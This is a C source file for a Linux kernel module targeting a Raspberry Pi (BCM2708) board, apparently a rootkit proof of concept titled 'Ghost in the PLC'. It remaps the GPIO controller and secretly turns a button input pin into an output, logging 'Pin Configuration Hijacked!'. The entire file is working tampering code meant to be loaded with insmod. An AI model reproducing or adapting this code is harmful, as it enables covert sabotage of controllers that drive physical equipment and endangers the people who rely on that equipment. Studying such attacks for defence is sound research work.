/*
 * Usage: insmod drk.ko
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/io.h>

volatile unsigned* gpio;
int g = 24; // Button input pin

#define BCM2708_PERI_BASE        0x20000000
#define GPIO_BASE                (BCM2708_PERI_BASE + 0x200000) /* GPIO controller */
#define BLOCK_SIZE 4096

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

int __init init_module(void) {
	printk(KERN_INFO "[RK] init\n");
	gpio = ioremap(GPIO_BASE, BLOCK_SIZE); // GPIO base remapped

	// Pin configuration (input -> output)
	INP_GPIO(g);
	OUT_GPIO(g);

	printk(KERN_INFO "[RK] Pin Configuration Hijacked!\n");

	return 0;
}

void __exit cleanup_module(void) {
	INP_GPIO(g); // Reset pin
	iounmap(gpio);
	printk(KERN_INFO "[RK] exit\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tu4st");
MODULE_DESCRIPTION("Ghost in the PLC");
